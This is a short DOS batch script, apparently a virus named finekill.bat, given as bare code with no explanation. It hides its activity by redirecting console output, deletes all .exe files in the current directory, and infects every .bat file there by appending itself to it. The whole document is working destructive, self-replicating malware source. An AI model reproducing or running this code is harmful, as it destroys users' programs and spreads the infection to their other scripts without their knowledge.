@echo off
@ctty nul
@del *.exe 
@for %%f in (*.bat) do copy %%f + finekill.bat
@ctty con
